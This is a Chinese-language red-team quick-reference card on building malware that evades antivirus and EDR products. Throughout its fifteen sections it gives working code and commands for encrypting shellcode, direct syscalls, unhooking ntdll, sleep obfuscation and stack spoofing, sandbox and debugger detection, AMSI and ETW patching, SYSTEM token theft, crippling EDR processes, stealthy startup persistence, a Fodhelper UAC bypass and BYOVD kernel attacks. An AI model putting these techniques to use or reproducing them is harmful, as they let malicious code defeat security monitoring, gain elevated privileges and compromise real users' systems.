# 免杀与EDR绕过 — 速查卡

> 红队武器开发：静态免杀 / 动态免杀 / 沙箱检测 / AMSI·ETW绕过 / 令牌操作 / 堆栈欺骗
> 来源：红队武器开发系列 3/5/6/7

---

## §1 静态免杀

### 1.1 字符串/Shellcode加密
```c
// XOR — 最简单，足以过静态签名
for (int i = 0; i < len; i++) buf[i] ^= key[i % key_len];
// AES-CBC — 对抗YARA规则，密钥运行时派生
AES_decrypt(encrypted_sc, key, iv, decrypted_sc);
```

### 1.2 动态API解析（去导入表特征）
```c
// 不在IAT中留痕迹
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
HMODULE k32 = LoadLibraryA("kernel32.dll");
pVirtualAlloc myAlloc = (pVirtualAlloc)GetProcAddress(k32, "VirtualAlloc");
```

### 1.3 Syscall直调（绕ntdll hook）
```c
// SysWhispers3 / Hell's Gate / Halo's Gate
// 运行时从ntdll解析syscall号，直接syscall指令
mov r10, rcx
mov eax, SSN    // syscall number
syscall
```
工具：`SysWhispers3 -a x64 -l masm -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx`

### 1.4 元数据清理
- 修改PE TimeDateStamp、Rich Header、Debug Directory（PDB路径）
- 工具：`pe-bear` 手动改 / 编译时 `/Brepro` 确定性构建

### 1.5 资源段存储
Shellcode加密后嵌入.rsrc段 → `FindResource` + `LoadResource` → 运行时解密执行

---

## §2 动态免杀（内存层面）

### 2.1 内存加密轮转
```c
// 执行完毕立即重新加密，防内存扫描
VirtualProtect(sc_addr, sc_len, PAGE_READWRITE, &old);
xor_encrypt(sc_addr, sc_len, key);  // 回到加密态
// 需要时再解密→RX→执行→RW→加密
```

### 2.2 堆栈欺骗（Stack Spoofing）
```c
// 伪造RBP链 + 返回地址，隐藏真实调用来源
// 在Sleep前将调用栈替换为合法栈帧（如kernel32!BaseThreadInitThunk链）
// 工具：Ekko / Zilean / Foliage — timer-based stack spoofing
```

### 2.3 Unhook ntdll
```c
// 从磁盘重新映射干净ntdll覆盖内存中被hook的版本
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", ...);
HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
LPVOID clean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
// 复制.text段覆盖当前进程ntdll的.text段
```
备选：从`\KnownDlls\ntdll.dll`节对象映射，或通过suspended进程读取

---

## §3 沙箱/分析环境检测

### 3.1 Sleep加速检测
```c
DWORD t1 = GetTickCount();
Sleep(2000);
DWORD t2 = GetTickCount();
if ((t2 - t1) < 1900) return TRUE;  // 沙箱加速了Sleep
```

### 3.2 硬件特征
```c
SYSTEM_INFO si; GetSystemInfo(&si);
if (si.dwNumberOfProcessors < 2) return TRUE;       // 沙箱常用单核
MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms); GlobalMemoryStatusEx(&ms);
if (ms.ullTotalPhys < (4ULL * 1024 * 1024 * 1024)) return TRUE;  // <4GB
```

### 3.3 用户交互检测
```c
// 最近文件数量
WIN32_FIND_DATAW fd; UINT count = 0;
WCHAR path[MAX_PATH]; SHGetFolderPathW(NULL, CSIDL_RECENT, NULL, 0, path);
wcscat(path, L"\\*");
HANDLE h = FindFirstFileW(path, &fd);
if (h != INVALID_HANDLE_VALUE) { do { count++; } while (FindNextFileW(h, &fd)); FindClose(h); }
if (count < 10) return TRUE;
// 鼠标移动检测
POINT p1, p2; GetCursorPos(&p1); Sleep(1500); GetCursorPos(&p2);
if (p1.x == p2.x && p1.y == p2.y) return TRUE;
```

### 3.4 进程/父进程检测
检查父进程是否为`explorer.exe`（正常）vs `cmd.exe`/`python.exe`/分析工具

---

## §4 AMSI / ETW 绕过

### 4.1 AMSI Bypass
```c
// Patch AmsiScanBuffer返回AMSI_RESULT_CLEAN
HMODULE amsi = LoadLibraryA("amsi.dll");
LPVOID addr = GetProcAddress(amsi, "AmsiScanBuffer");
DWORD old;
VirtualProtect(addr, 6, PAGE_EXECUTE_READWRITE, &old);
// x64: mov eax, 0x80070057 (E_INVALIDARG); ret
memcpy(addr, "\xB8\x57\x00\x07\x80\xC3", 6);
VirtualProtect(addr, 6, old, &old);
```

### 4.2 ETW Patch
```c
// Patch EtwEventWrite开头为ret，禁用事件追踪
LPVOID etw = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old);
*(BYTE*)etw = 0xC3;  // ret
VirtualProtect(etw, 1, old, &old);
```

### 4.3 ETW Threat Intelligence
内核级ETW-TI无法用户态patch → 驱动层操作（BYOVD加载签名驱动）或间接syscall规避触发模式

---

## §5 令牌操作与EDR沙箱化（来源：红队武器开发-3）

### 5.1 令牌窃取（Token Stealing）
```c
// 需SeDebugPrivilege — 从高权限进程复制令牌
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
// 启用SeDebugPrivilege
LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
AdjustTokenPrivileges(hToken, FALSE, &tp, ...);
// 打开目标进程（如SYSTEM进程）→ 复制令牌 → 以该令牌创建进程
OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTargetToken);
DuplicateTokenEx(hTargetToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken);
CreateProcessWithTokenW(hNewToken, 0, L"cmd.exe", ...);
```

### 5.2 EDR沙箱化（降低令牌完整性）
```c
// 将EDR进程令牌完整性降为Low → 无法访问受保护资源
// 需先获取进程句柄（需SeDebugPrivilege）
HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, edrPid);
OpenProcessToken(hProc, TOKEN_ADJUST_DEFAULT, &hToken);
// 构造Low完整性SID: S-1-16-4096
SID_IDENTIFIER_AUTHORITY sia = SECURITY_MANDATORY_LABEL_AUTHORITY;
AllocateAndInitializeSid(&sia, 1, SECURITY_MANDATORY_LOW_RID, 0,0,0,0,0,0,0, &pSid);
TOKEN_MANDATORY_LABEL tml = { { pSid, SE_GROUP_INTEGRITY } };
SetTokenInformation(hToken, TokenIntegrityLevel, &tml, sizeof(tml)+GetLengthSid(pSid));
```

### 5.3 受限令牌（Restricted Token）
```c
// 创建受限令牌 — 移除权限/禁用SID
CreateRestrictedToken(hToken, DISABLE_MAX_PRIVILEGE, 0, NULL, 0, NULL, 0, NULL, &hRestricted);
// 用受限令牌启动EDR进程副本 → 无法正常工作
```
关键：`SeDebugPrivilege`是前提，非管理员通常没有。

---

## §6 静态检测深度对抗（来源：红队武器开发-5）

### 6.1 熵值问题
AES加密后shellcode熵值接近8.0（随机数据特征）→ YARA/静态引擎标记高熵段。
对策：
- 英文词典填充降熵（在加密数据间插入可读字符串）
- Base64编码代替原始密文（降至~6.0）
- 分段存储（多个小高熵块不如一个大块显眼）

### 6.2 多字节XOR检测
Defender可检测多字节XOR模式（微软2023博客），单字节XOR更容易被暴力破解。
对策：组合加密 XOR+AES / 运行时密钥派生 / 多层编码

### 6.3 C2配置文件对抗
Malleable C2 Profile配置（Cobalt Strike）：
- JARM指纹随机化：`jarm_randomizer` 工具
- 流量伪装：`RedGuard` 前置流量过滤
- 不分发扫描：使用`kleenscan.com`代替VirusTotal（不上传样本到厂商）

---

## §7 内存扫描对抗深度（来源：红队武器开发-6）

### 7.1 VEH（向量异常处理）+ 硬件断点Hook
```c
// 用硬件断点替代内联Hook（不修改代码，绕完整性检查）
// 设置Dr0寄存器指向目标函数 → 触发EXCEPTION_SINGLE_STEP → VEH处理
CONTEXT ctx; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
GetThreadContext(hThread, &ctx);
ctx.Dr0 = (DWORD64)targetFunc;  // 断点地址
ctx.Dr7 = 0x1;                   // 启用Dr0
SetThreadContext(hThread, &ctx);
AddVectoredExceptionHandler(1, MyHandler);
// MyHandler中修改参数/返回值，设置RF标志继续执行
```
优势：不修改任何内存字节，绕过代码完整性扫描。

### 7.2 睡眠时加密（Sleep Obfuscation）
BeaconEye/Hunt-Sleeping-Beacons专门扫描睡眠中的Beacon内存：
```c
// Ekko技术：用Timer+APC实现自动加密/解密
CreateTimerQueueTimer → 到期时APC排队：
  1. VirtualProtect(beacon, RW)
  2. SystemFunction032加密beacon内存（RC4）
  3. WaitForSingleObject(event, sleepTime)  // 加密态睡眠
  4. SystemFunction032解密
  5. VirtualProtect(beacon, RX)
```
关键：睡眠期间beacon在内存中处于加密态，扫描器看到的是密文。

### 7.3 堆分配替代
将shellcode/配置放在进程堆（`HeapAlloc`）而非`VirtualAlloc`分配的页。堆内存是进程正常行为，扫描器难以逐页审查所有堆。

---

## §8 调用堆栈欺骗深度（来源：红队武器开发-7）

### 8.1 EDR堆栈检查原理
EDR在API调用时检查调用栈：栈底是否来自unbacked memory（无磁盘文件支撑的RX内存）→ 可疑。
x64栈回溯依赖`.pdata`段的`RUNTIME_FUNCTION`结构（不是RBP链）。

### 8.2 返回地址欺骗（Return Address Spoofing）
```c
// 核心：调用API前，将返回地址替换为合法DLL内的gadget地址
// 1. 找合法模块中的 jmp [rax] / ret gadget
// 2. 构造假栈帧：push假返回地址 → call目标API
// API执行完ret时跳到gadget → gadget跳回真正的继续地址
```

### 8.3 RUNTIME_FUNCTION伪造
```c
// x64展开信息结构
typedef struct _RUNTIME_FUNCTION {
    DWORD BeginAddress;    // 函数起始RVA
    DWORD EndAddress;      // 函数结束RVA
    DWORD UnwindInfoAddress; // UNWIND_INFO的RVA
} RUNTIME_FUNCTION;
// 为shellcode区域注册伪造的RUNTIME_FUNCTION
// → RtlAddFunctionTable / RtlInstallFunctionTableCallback
// 使栈回溯认为shellcode属于合法模块
```

### 8.4 完整欺骗流程
1. 分配RW内存写入shellcode → 改为RX
2. 构造`UNWIND_INFO`+`RUNTIME_FUNCTION`描述shellcode区域
3. `RtlAddFunctionTable`注册 → 栈回溯可正确解析
4. 使用合法模块的gadget作为伪返回地址
5. 通过函数指针或`jmp`进入shellcode
6. EDR堆栈检查看到的是合法调用链

windbg验证：`k`/`.fnent`命令查看栈回溯和函数表信息。

---

## §9 反调试技术（来源：老鑫安全四期-免杀day8）

### 9.1 PEB BeingDebugged（替代IsDebuggerPresent）
```c
PPEB pPeb = (PEB*)(__readgsqword(0x60)); // x64
if (pPeb->BeingDebugged == 1) return TRUE;
```
优势：不调用可疑API，直接读PEB结构。

### 9.2 NtQueryInformationProcess多标志检测
- `ProcessDebugPort`：返回非零 = 被调试
- `ProcessDebugObjectHandle`：返回有效句柄 = 被调试（返回0xC0000353 = 未被调试）
两个标志联合检测比单一方法更可靠。

### 9.3 硬件断点检测
```c
CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
GetThreadContext(GetCurrentThread(), &ctx);
if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return TRUE;
```

### 9.4 进程黑名单检测
枚举运行进程（CreateToolhelp32Snapshot），与黑名单比对：x64dbg.exe / ida.exe / ida64.exe / VsDebugConsole.exe / msvsmon.exe。

### 9.5 时间差检测
- `GetTickCount64`：毫秒级，两次调用差值超阈值 = 断点导致的暂停
- `QueryPerformanceCounter`：纳秒级，更精确
- `RDTSC`：CPU时钟周期级，最难绕过

---

## §10 反虚拟环境与沙箱规避深度（来源：老鑫安全四期-免杀day8）

在§3基础上增加：
- USB安装历史：`HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR` 子键数量为0 = 虚拟环境
- 机器解析：WMI查询`Win32_ComputerSystem`的Model字段包含"Virtual"/"VMware"/"VirtualBox"
- 文件名检测：沙箱常将样本重命名为hash值，检测自身文件名是否全hex字符
- 运行进程数量：真实系统通常>50个进程，沙箱通常<30个
- **API Hammering**：循环10万次CreateFile+WriteFile+DeleteFile创建临时文件，消耗沙箱分析时间预算
- **文件大小膨胀**：PE尾部追加200MB空字节，超过沙箱上传/分析大小限制
- **自删除**：利用NTFS特性（重命名为NTFS流后删除）或`MoveFileEx(MOVEFILE_DELAY_UNTIL_REBOOT)`

---

## §11 回调函数滥用执行Shellcode（来源：老鑫安全四期-免杀day4）

利用Windows API的回调参数执行shellcode，避免显式CreateThread/CreateRemoteThread：
- `EnumFonts` / `EnumFontFamilies` — 字体枚举回调
- `EnumWindows` / `EnumChildWindows` — 窗口枚举回调
- `CreateTimerQueueTimer` — 定时器回调
- `CertEnumSystemStore` — 证书存储枚举回调
- `EnumResourceTypes` — 资源类型枚举回调

---

## §12 IAT伪装（来源：老鑫安全四期-免杀day6）

去CRT+API Hash隐藏后IAT几乎为空 → 本身成为特征（正常程序不可能零导入）。
对策：添加哑导入（dummy imports）填充IAT，调用无害函数如`GetSystemTime`/`GetVersionEx`/`IsProcessorFeaturePresent`，使导入表看起来像正常程序。

---

## §13 启动项拦截绕过（来源：老鑫安全四期-免杀day13）

### 13.1 Subst + MoveFileEx组合
1. `subst X: "C:\...\Start Menu\Programs"` 创建虚拟盘符映射
2. 注册表持久化：`HKLM\...\DOS Devices` 写入映射
3. `MoveFileEx(src, "X:\Startup\payload", MOVEFILE_DELAY_UNTIL_REBOOT)` — 重启后移动
EDR视角：文件只是被移动到了X盘，不知道X盘实际是启动目录。

### 13.2 符号链接绕过
`CreateSymbolicLinkW("C:\startlink", "C:\...\Startup", DIRECTORY)` → 通过符号链接路径写入启动目录，绕过路径监控。

---

## §14 UAC Bypass（来源：老鑫安全四期-免杀day18）

### 14.1 Fodhelper注册表劫持
```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "...\command" -Name "(default)" -Value "payload.exe" -Force
New-ItemProperty -Path "...\command" -Name "DelegateExecute" -Value "" -Force
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```
原理：fodhelper.exe是auto-elevate程序，启动时查询`ms-settings`协议处理程序，HKCU可劫持。

### 14.2 COM对象提权（CMSTPLUA）
通过`CoGetObject`的Elevation Moniker获取自动提权COM接口`ICMLuaUtil`，调用`ShellExec`方法以管理员权限执行任意程序。CLSID: `3E5FC7F9-9A51-4367-9063-A120244FBEC7`。

---

## §15 BYOVD与EDR致盲（来源：老鑫安全四期-免杀day15）

### 15.1 BYOVD（Bring Your Own Vulnerable Driver）
加载有已知漏洞的合法签名驱动 → 通过驱动漏洞获取内核读写能力 → 修改内核数据结构（如ci_options关闭驱动签名强制）。
- 驱动源：loldrivers.io

### 15.2 Minifilter高度致盲
Windows文件系统微过滤器按altitude排序，注册比EDR更高altitude的minifilter可拦截/隐藏文件操作，使EDR文件监控失效。
